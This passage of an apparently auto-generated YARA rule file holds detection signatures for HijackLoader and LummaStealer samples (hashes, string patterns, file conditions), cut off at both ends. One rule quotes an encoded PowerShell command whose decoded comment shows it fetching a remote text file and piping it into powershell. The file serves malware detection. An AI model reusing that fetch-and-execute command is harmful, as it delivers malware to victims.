      $s13 = "GmXnqazlSnNXTcsrEJTjCJSvyJBvGhkcBDFINzqehYofdKNlLHIhghzxTcohYDflClVPXkeFTpCdUmSovPkyYCwUEHplKJFdtDdsoxObdDOreVcgJzlJThMzpBLPvsuJ" ascii /* score: '9.00'*/
      $s14 = "UvMRwxVmlRhxCPeXCjmzWvmptYWkbdaEfPqYpXScnpGNazZkbyUYKJdYJXXXalKIrcRmZFieQKMhpZOtymIdJCuWmRPRzuBCfyVxhnLVQpHAxwikJdYochypivAHqQeW" ascii /* score: '9.00'*/
      $s15 = "2]63>8736E703B3B';" fullword ascii /* score: '9.00'*/ /* hex encoded string '&8snp;;' */
   condition:
      uint16(0) == 0x6f4f and filesize < 80KB and
      8 of them
}

rule HijackLoader_signature__148f54bf {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_148f54bf.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "148f54bfc58e7b1a24a3d94eec038437e7ef48852ff0edc4c729ec6f27637a5e"
   strings:
      $s1 = "Kreadsaed.hwT" fullword ascii /* score: '13.00'*/
      $s2 = "vyzK.ITz=[" fullword ascii /* score: '10.00'*/
      $s3 = "9dQpE:\\6" fullword ascii /* score: '10.00'*/
      $s4 = "YgesPY>4" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      all of them
}

rule HijackLoader_signature__5deb702c {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_5deb702c.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5deb702c44e2668f5778e5ab9c3dc70f4d80914e6ea89138eaef29e90901f77f"
   strings:
      $x1 = "TableTypeComponent_FilewhSkWDPV5PbwBKwzFGJNrPMYvb4N3vBreebgoo.rhLanguageFileNameVersionip1p_mkn.exe|ClDrive16.exe10.48.20.01033i" ascii /* score: '57.00'*/
      $x2 = "all level at which record will be initially selected. An install level of 0 will disable an item and prevent its display.UpperCa" ascii /* score: '43.00'*/
      $s3 = "AppDataFoldernhksmsmw|TurnaroundTARGETDIR.SourceDirFeatureFeature_ParentTitleDescriptionDisplayLevelHorselaughFeatureCustomActio" ascii /* score: '27.00'*/
      $s4 = "13eMOl714.44.35112.1et4g40qb.dll|vcruntime140_1.dllhG3vvZDdOfpOjoWGpiXUComponentComponentIdDirectory_ConditionKeyPath{B875DA96-7" ascii /* score: '25.00'*/
      $s5 = "cuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreateFoldersRegisterUserRegisterProductMediaDiskIdLastSeq" ascii /* score: '21.00'*/
      $s6 = ".dllPtxuLQBmcFox1oaigam.dll|ProtobufLite.dllBgAVGDNNMN6yK1c410511.0.54.0sciter-x.dllEFEazIQj4J5zovihklqt.dll|VCRUNTIME140.dlloK5" ascii /* score: '19.00'*/
      $s7 = "ined from the Directory table.Remote execution option, one of irsEnumA conditional statement that will disable this component if" ascii /* score: '18.00'*/
      $s8 = "60C}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExecuteSequenceInstallValidateInstallInitializeInstallAdm" ascii /* score: '18.00'*/
      $s9 = "inPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPublishProductInstallUISequenceValidateProductIDInstallExe" ascii /* score: '18.00'*/
      $s10 = "TableTypeComponent_FilewhSkWDPV5PbwBKwzFGJNrPMYvb4N3vBreebgoo.rhLanguageFileNameVersionip1p_mkn.exe|ClDrive16.exe10.48.20.01033i" ascii /* score: '17.00'*/
      $s11 = "etermines the sort order in which the actions are to be executed. Leave blank to suppress action.Primary key, integer to determi" ascii /* score: '17.00'*/
      $s12 = "me of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Langu" ascii /* score: '17.00'*/
      $s13 = "nActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_PropertyValueManufacturerLethargy LegitimProductCode{4D030B7C-" ascii /* score: '17.00'*/
      $s14 = "Longer descriptive text describing a visible feature item.Numeric sort order, used to force a specific display ordering.The inst" ascii /* score: '16.00'*/
      $s15 = "ort order in which the actions are to be executed.  Leave blank to suppress action.Optional expression which skips the action if" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 22000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__72acf597 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_72acf597.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "72acf597de6ade41537a8d9d153e89064168ed780feeffc66ecf3081922fd87d"
   strings:
      $x1 = "TableTypeComponent_FileYQZU4zBKBP1D3.3.1.01033LanguageFileNameVersionuofnxj8d.hw|Kreadsaed.hwptMBchsnD76XqBugSplat.dll45scczy1.e" ascii /* score: '57.00'*/
      $x2 = ", consisting of source location, code type, entry, option flags.CustomSourceThe table reference of the source of the code.Format" ascii /* score: '43.00'*/
      $s3 = "turesPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFo" ascii /* score: '29.00'*/
      $s4 = "ureFeature_ParentTitleDescriptionDisplayLevelQueueFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFe" ascii /* score: '23.00'*/
      $s5 = "TableTypeComponent_FileYQZU4zBKBP1D3.3.1.01033LanguageFileNameVersionuofnxj8d.hw|Kreadsaed.hwptMBchsnD76XqBugSplat.dll45scczy1.e" ascii /* score: '22.00'*/
      $s6 = "nAdminExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFea" ascii /* score: '18.00'*/
      $s7 = "uctVersion10.6.7.0UpgradeCode{702DCA08-0CB6-45BF-BB64-D81C91DFEF24}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActio" ascii /* score: '17.00'*/
      $s8 = "xe|PipeDebug52.exeSequenceAttributesFileSizeakWPY2JHpvHhefa3wjm.rus|Waing.rusvzX38xj5eHComponentComponentIdDirectory_ConditionKe" ascii /* score: '17.00'*/
      $s9 = "85D}{FC628901-C860-5E4F-8532-F732EC022B73}DirectoryDirectory_ParentDefaultDirTempFolder8dj3xujv|ScaphopodTARGETDIR.SourceDirFeat" ascii /* score: '17.00'*/
      $s10 = " a root item.TextShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.Numeric" ascii /* score: '16.00'*/
      $s11 = "either by the AppSearch action or with the default setting obtained from the Directory table.Remote execution option, one of irs" ascii /* score: '15.00'*/
      $s12 = "minate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed.  Leave blank t" ascii /* score: '14.00'*/
      $s13 = "engine will terminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed." ascii /* score: '14.00'*/
      $s14 = "auncher or loader.String value for property.  Never null or empty.Name of action to invoke, either in the engine or the handler " ascii /* score: '13.00'*/
      $s15 = "nnectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCase;LowerCase;Filename;Paths;AnyPath;" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 10000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__7adcc846 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_7adcc846.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7adcc8466d2e071c926f0fdf9b5a601de304ef017df7d5cc0a1032b85783aad5"
   strings:
      $x1 = "TableTypeComponent_FileFEemFP5am3Q22T2kfTj6Uc4OnKEbunvai6ebbyj.cha|Claet.chauLanguageFileNameVersionmfc110u.dll11.0.60610.110331" ascii /* score: '57.00'*/
      $x2 = "33;34;36;37;38;48;49;50;52;53;54Feature attributesPrimary key, name of action, normally appears in sequence table unless private" ascii /* score: '43.00'*/
      $s3 = "nalizeAdvtExecuteSequencePublishFeaturesPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsU" ascii /* score: '29.00'*/
      $s4 = "edTARGETDIR.SourceDirFeatureFeature_ParentTitleDescriptionDisplayLevelMoitFeatureCustomActionActionSourceTargetExtendedTypeLaunc" ascii /* score: '23.00'*/
      $s5 = "TableTypeComponent_FileFEemFP5am3Q22T2kfTj6Uc4OnKEbunvai6ebbyj.cha|Claet.chauLanguageFileNameVersionmfc110u.dll11.0.60610.110331" ascii /* score: '22.00'*/
      $s6 = "Remote execution option, one of irsEnumA conditional statement that will disable this component if the specified condition evalu" ascii /* score: '18.00'*/
      $s7 = "izeFileCostCostFinalizeExecuteActionAdminExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFi" ascii /* score: '18.00'*/
      $s8 = "ich the actions are to be executed. Leave blank to suppress action.Primary key, integer to determine sort order for table.File s" ascii /* score: '17.00'*/
      $s9 = " linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCas" ascii /* score: '16.00'*/
      $s10 = "gpeq.zbb|Theasbroumfeem.zbbozE8rYoNoCFEhesComponentComponentIdDirectory_ConditionKeyPath{41793C72-0B8C-55A5-BDC6-DE221B4B365D}IN" ascii /* score: '16.00'*/
      $s11 = " with a Null parent represents a root of the install tree.The default sub-path under parent's path.Primary key used to identify " ascii /* score: '16.00'*/
      $s12 = " are to be executed.  Leave blank to suppress action.Optional expression which skips the action if evaluates to expFalse. If the" ascii /* score: '14.00'*/
      $s13 = "1.0.51106.1SequenceAttributesFileSizeMSVCP110.dlltjQLseMlNINiw50sMSVCR110.dllBWmk1o8i8bBr22O1.0.0.23Nano-Ex.exerNCr9hWICdN8B7jkb" ascii /* score: '13.00'*/
      $s14 = "ique to this component, version, and language.Required key of a Directory table record. This is actually a property name whose v" ascii /* score: '13.00'*/
      $s15 = "t extends code type or option flags of the Type column.Foreign key into Feature table.Foreign key into Component table.Name of p" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 15000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__c3c7f284 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_c3c7f284.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c3c7f284013e2a6a442f7ca99e6bdc22cace15af2eaf345046f8503429bea54f"
   strings:
      $x1 = "TableTypeComponent_FileJvq1hxf91.0.0.01033LanguageFileNameVersionPlain.jiuYSDoUMJ5esddrbi.exe|G-Aggregator36.exeRobdrie.qccSeque" ascii /* score: '57.00'*/
      $x2 = "nsisting of source location, code type, entry, option flags.CustomSourceThe table reference of the source of the code.FormattedE" ascii /* score: '43.00'*/
      $s3 = "sPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFolder" ascii /* score: '29.00'*/
      $s4 = "eature_ParentTitleDescriptionDisplayLevelSplitFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeatur" ascii /* score: '23.00'*/
      $s5 = "nceAttributesFileSizerywHVDnsAEd0q_zzebd.dll|sdHookpp.64.dllrus9pxJNVYdJ3j4xnnComponentComponentIdDirectory_ConditionKeyPath{D8A" ascii /* score: '22.00'*/
      $s6 = "FAE2-1BB6-50E3-A9C3-F212F2BD1006}DirectoryDirectory_ParentDefaultDirAppDataFolderrm_o2emy|DiscrepancyTARGETDIR.SourceDirFeatureF" ascii /* score: '21.00'*/
      $s7 = "Version5.3.4.0UpgradeCode{F81133BA-54EB-4F8F-A51F-FE6E8BC49CDD}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdm" ascii /* score: '21.00'*/
      $s8 = "inExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeature" ascii /* score: '18.00'*/
      $s9 = "her or loader.String value for property.  Never null or empty.Name of action to invoke, either in the engine or the handler DLL." ascii /* score: '18.00'*/
      $s10 = "TableTypeComponent_FileJvq1hxf91.0.0.01033LanguageFileNameVersionPlain.jiuYSDoUMJ5esddrbi.exe|G-Aggregator36.exeRobdrie.qccSeque" ascii /* score: '17.00'*/
      $s11 = "oot item.TextShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.Numeric sor" ascii /* score: '16.00'*/
      $s12 = "net order.Primary key used to identify a particular component record.GuidA string GUID unique to this component, version, and la" ascii /* score: '16.00'*/
      $s13 = "er by the AppSearch action or with the default setting obtained from the Directory table.Remote execution option, one of irsEnum" ascii /* score: '15.00'*/
      $s14 = "te, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed.  Leave blank to su" ascii /* score: '14.00'*/
      $s15 = "ne will terminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed. Lea" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 21000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__e6f4d4f6 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_e6f4d4f6.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e6f4d4f68abd1d5ced36d1606d16c42b63a06c5c681d4662b00fb8683bf2a418"
   strings:
      $x1 = "TableTypeComponent_FilePtxuLQBmcFo14.29.30139.01033LanguageFileNameVersionMSVCP140.dlltLgzcEirIMBrfHjzbW7bmfc140u.dllppevnt.iniS" ascii /* score: '61.00'*/
      $x2 = "entTitleDescriptionDisplayLevelDoallFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_Property" ascii /* score: '41.00'*/
      $s3 = "tExecuteSequencePublishFeaturesPublishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishF" ascii /* score: '29.00'*/
      $s4 = "shProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreat" ascii /* score: '29.00'*/
      $s5 = "zjfte.exe|Sync-Station.exeVMp9LwxbqQhxUp.dllf3HWu9IiHHneovihklqt.dll|VCRUNTIME140.dlloK513eMOl7ComponentComponentIdDirectory_Con" ascii /* score: '25.00'*/
      $s6 = "ARGETDIR.SourceDirFeatureFeature_ParentTitleDescriptionDisplayLevelDoallFeatureCustomActionActionSourceTargetExtendedTypeLaunchF" ascii /* score: '23.00'*/
      $s7 = "entTitleDescriptionDisplayLevelDoallFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_Property" ascii /* score: '23.00'*/
      $s8 = "TableTypeComponent_FilePtxuLQBmcFo14.29.30139.01033LanguageFileNameVersionMSVCP140.dlltLgzcEirIMBrfHjzbW7bmfc140u.dllppevnt.iniS" ascii /* score: '19.00'*/
      $s9 = "der.Primary key used to identify a particular component record.GuidA string GUID unique to this component, version, and language" ascii /* score: '19.00'*/
      $s10 = "uteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPubli" ascii /* score: '18.00'*/
      $s11 = "3.8.10.0UpgradeCode{E3BFFD09-4364-4DC7-BA44-B301D4236A83}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExec" ascii /* score: '18.00'*/
      $s12 = "stCostFinalizeExecuteActionAdminExecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdv" ascii /* score: '18.00'*/
      $s13 = "ctions are to be executed. Leave blank to suppress action.Primary key, integer to determine sort order for table.File sequence n" ascii /* score: '17.00'*/
      $s14 = "mn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Language;Identifier;Binary;UpperCase;LowerCa" ascii /* score: '16.00'*/
      $s15 = "ull parent represents a root of the install tree.The default sub-path under parent's path.Primary key used to identify a particu" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 16000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__ead6b1f0 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_ead6b1f0.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ead6b1f0add059261ac56e9453131184bc0ae2869f983b6a41a1abb167edf151"
   strings:
      $x1 = "TableTypeComponent_FileYIBxrWM1Klll3.6.0.111033LanguageFileNameVersionpfrpgtlq.saa|Ceertpleet.saajST3Fe7baXjrbbxfug.dll|BugSplat" ascii /* score: '61.00'*/
      $x2 = "FeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_PropertyValueManufacturerShirt BaldpateProdu" ascii /* score: '38.00'*/
      $x3 = "ProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreateFoldersRegisterUserRegisterProduc" ascii /* score: '32.00'*/
      $s4 = "jdt7zau.dll|WSMultiTagMgr.dllybTT81l3C5oNs35t1z8.0.0.0WS_Log.DLLplxbC1W3PNHp8RpDSzComponentComponentIdDirectory_ConditionKeyPath" ascii /* score: '30.00'*/
      $s5 = "lishProductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCre" ascii /* score: '29.00'*/
      $s6 = "DescriptionDisplayLevelNoncommercialFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_Property" ascii /* score: '23.00'*/
      $s7 = "TableTypeComponent_FileYIBxrWM1Klll3.6.0.111033LanguageFileNameVersionpfrpgtlq.saa|Ceertpleet.saajST3Fe7baXjrbbxfug.dll|BugSplat" ascii /* score: '22.00'*/
      $s8 = "5216-95BB-923CBFA1EC50}DirectoryDirectory_ParentDefaultDirLocalAppDataFolderDendronTARGETDIR.SourceDirFeatureFeature_ParentTitle" ascii /* score: '20.00'*/
      $s9 = "order.Primary key used to identify a particular component record.GuidA string GUID unique to this component, version, and langua" ascii /* score: '19.00'*/
      $s10 = "item.TextShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.Numeric sort or" ascii /* score: '19.00'*/
      $s11 = "or loader.String value for property.  Never null or empty.Name of action to invoke, either in the engine or the handler DLL.Opti" ascii /* score: '18.00'*/
      $s12 = "nitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPublishProductInstallUISequenceValidate" ascii /* score: '18.00'*/
      $s13 = "4CDC-9B5E-2BE30956E8E2}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExecuteSequenceInstallValidateInstallI" ascii /* score: '18.00'*/
      $s14 = "ecuteSequenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPub" ascii /* score: '18.00'*/
      $s15 = "ion2.4.1.0UpgradeCode{CF6F1CBF-FD13-4CDC-9B5E-2BE30956E8E2}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminEx" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 18000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__f1051b84 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_f1051b84.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f1051b842f6ba781236e736bcb3a1ed9c10bc2036b6f9d2c43062e0bf7b25bba"
   strings:
      $x1 = "TableTypeComponent_File2.7.0.1100x7OxtEbxxBnLZM4OFyk3f4g4ikh3.ju|Bieckprengchaeb.juLanguageFileNameVersion1033m7w1sSpBb61f8t6nnz" ascii /* score: '57.00'*/
      $x2 = "sPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom action type, consisting o" ascii /* score: '43.00'*/
      $s3 = "oductInstallUISequenceValidateProductIDInstallExecuteSequenceProcessComponentsUnpublishFeaturesRemoveFilesRemoveFoldersCreateFol" ascii /* score: '29.00'*/
      $s4 = "entTitleDescriptionDisplayLevelDesktopFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_Proper" ascii /* score: '23.00'*/
      $s5 = "}{C3E51A6C-C9AF-5337-849E-11CD5E0C370A}DirectoryDirectory_ParentDefaultDirAppDataFolderReddTARGETDIR.SourceDirFeatureFeature_Par" ascii /* score: '21.00'*/
      $s6 = "t0oa2yud.exe|Turbo-Inj.exemuZGwQBpzFOzW5Ynn5SAComponentComponentIdDirectory_ConditionKeyPath{A4DA90D8-4D9C-5E27-A703-E8CE746BC33" ascii /* score: '20.00'*/
      $s7 = "Primary key used to identify a particular component record.GuidA string GUID unique to this component, version, and language.Req" ascii /* score: '19.00'*/
      $s8 = "equenceInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeAdvtExecuteSequencePublishFeaturesPublishPr" ascii /* score: '18.00'*/
      $s9 = ".5.0UpgradeCode{440BE4C0-C79E-463C-91A1-CFD1F135F2A9}AdminUISequenceCostInitializeFileCostCostFinalizeExecuteActionAdminExecuteS" ascii /* score: '18.00'*/
      $s10 = "71.pf|Drirtflig.pfmav80dgi.dll|OmgbkupRes_ENU.dllSequenceAttributesFileSizeDiAINpdggVlMo2Qo5.0.4.1100SsCustom.dllO6ievponoPnqdT0" ascii /* score: '16.00'*/
      $s11 = "extShort text identifying a visible feature item.Longer descriptive text describing a visible feature item.Numeric sort order, u" ascii /* score: '16.00'*/
      $s12 = "AppSearch action or with the default setting obtained from the Directory table.Remote execution option, one of irsEnumA conditio" ascii /* score: '15.00'*/
      $s13 = "rminate, returning iesBadActionData.Number that determines the sort order in which the actions are to be executed. Leave blank t" ascii /* score: '14.00'*/
      $s14 = "ing iesBadActionData.Number that determines the sort order in which the actions are to be executed.  Leave blank to suppress act" ascii /* score: '14.00'*/
      $s15 = "sPrimary key, name of action, normally appears in sequence table unless private use.The numeric custom action type, consisting o" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule HijackLoader_signature__562fce7b {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_562fce7b.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "562fce7b523adeb74f36a15db8d8ca189776ecc10a36d48ab7c5cf22b77b3b73"
   strings:
      $s1 = "AYQB1AHQALQBzAHcAaQBzAHMALgBjAG8AbQAvAGIALwBiAC4AdAB4AHQAKQAuAEMAbwBuAHQAZQBuAHQAIAB8AHAAbwB3AGUAcgBzAGgAZQBsAGwA" fullword ascii /* base64 encoded string 'a u t - s w i s s . c o m / b / b . t x t ) . C o n t e n t   | p o w e r s h e l l ' */ /* score: '10.00'*/
      $s2 = "powershell -wind mi -Enc KAAuACAAKAAoAGcAYQBsACAAKgApAFsAMQA0ADkAXQAuAE4AYQBtAGUAKQAgAC0AdQBzAGUAYgBhACAAaAB0AHQAcABzADoALwAvAG0" ascii /* score: '9.00'*/
      $s3 = "powershell -wind mi -Enc KAAuACAAKAAoAGcAYQBsACAAKgApAFsAMQA0ADkAXQAuAE4AYQBtAGUAKQAgAC0AdQBzAGUAYgBhACAAaAB0AHQAcABzADoALwAvAG0" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 1KB and
      all of them
}

rule HijackLoader_signature__84aca602 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_84aca602.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "84aca6026bcb4e93b37118ea3577a5457ed8dafb60097f9fcf45a9b8e5ffb4f8"
   strings:
      $s1 = "Turnaround/VCRUNTIME140.dll" fullword ascii /* score: '23.00'*/
      $s2 = "Turnaround/vcruntime140_1.dll" fullword ascii /* score: '23.00'*/
      $s3 = "Turnaround/ProtobufLite.dll" fullword ascii /* score: '20.00'*/
      $s4 = "Turnaround/libcurl.dll" fullword ascii /* score: '20.00'*/
      $s5 = "Turnaround/sciter-x.dll" fullword ascii /* score: '20.00'*/
      $s6 = "Turnaround/MSVCP140.dll" fullword ascii /* score: '20.00'*/
      $s7 = "Turnaround/ClDrive16.exe" fullword ascii /* score: '19.00'*/
      $s8 = "wdddlll||" fullword ascii /* score: '9.00'*/
      $s9 = "* a#$." fullword ascii /* score: '9.00'*/
      $s10 = "* fc*." fullword ascii /* score: '9.00'*/
      $s11 = "<\"5^.6\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
      $s12 = "O@@@DDDLLLBB" fullword ascii /* score: '9.00'*/
      $s13 = "7>0>$>,>\">!>" fullword ascii /* score: '9.00'*/ /* hex encoded string 'p' */
      $s14 = "gvggwggggf" fullword ascii /* score: '8.00'*/
      $s15 = "&-1%I%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 25000KB and
      8 of them
}

rule HijackLoader_signature__726cdbd4 {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_726cdbd4.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "726cdbd46949280551166f44bfddca300fed646b1743526488b8e781ef775dde"
   strings:
      $s1 = "Scaphopod/PipeDebug52.exe" fullword ascii /* score: '21.00'*/
      $s2 = "Scaphopod/BugSplat.dll" fullword ascii /* score: '16.00'*/
      $s3 = "(diCYiq%m%" fullword ascii /* score: '8.00'*/
      $s4 = "uhigpidx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 10000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__81210016 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_81210016.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "812100163b5f2f577112e1170299ff175c7a6a03535a3beb6b956dd754234f7f"
   strings:
      $s1 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s2 = "9rzbXV:\"" fullword ascii /* score: '10.00'*/
      $s3 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s4 = "* `>6\" ?" fullword ascii /* score: '9.00'*/
      $s5 = "xuozpdsy" fullword ascii /* score: '8.00'*/
      $s6 = "xkuqxdzy" fullword ascii /* score: '8.00'*/
      $s7 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__a0c3b677 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_a0c3b677.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a0c3b67743fd284dc398aaf5e5d2e7a83ec2f7b5bb88af09821ee4ce8f314e21"
   strings:
      $s1 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s2 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s3 = "* `>6\" ?" fullword ascii /* score: '9.00'*/
      $s4 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s5 = "gvugmryw" fullword ascii /* score: '8.00'*/
      $s6 = "qrbjzegq" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__b2b60402 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_b2b60402.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b2b6040244b0182d01a1cede47a96cfe44ee8da80dc27a571e54ffe54395e8a0"
   strings:
      $s1 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s2 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s3 = "QwsN.IYD" fullword ascii /* score: '10.00'*/
      $s4 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s5 = "ltbuxwvb" fullword ascii /* score: '8.00'*/
      $s6 = "ogtncjsn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__e07f5de2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_e07f5de2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e07f5de29f8d2c4710513db04006a803463060f5f57708d2a357437743bffc4c"
   strings:
      $s1 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s2 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s3 = "* $,&rd`a" fullword ascii /* score: '9.00'*/
      $s4 = "        publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s5 = "lspbvymt" fullword ascii /* score: '8.00'*/
      $s6 = "worlokaj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__e2140c63 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_e2140c63.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e2140c6390f7696be2a70de9072137210c6ec238e5586fce237917a2082bbdd9"
   strings:
      $s1 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s2 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s3 = "* `>6\" ?" fullword ascii /* score: '9.00'*/
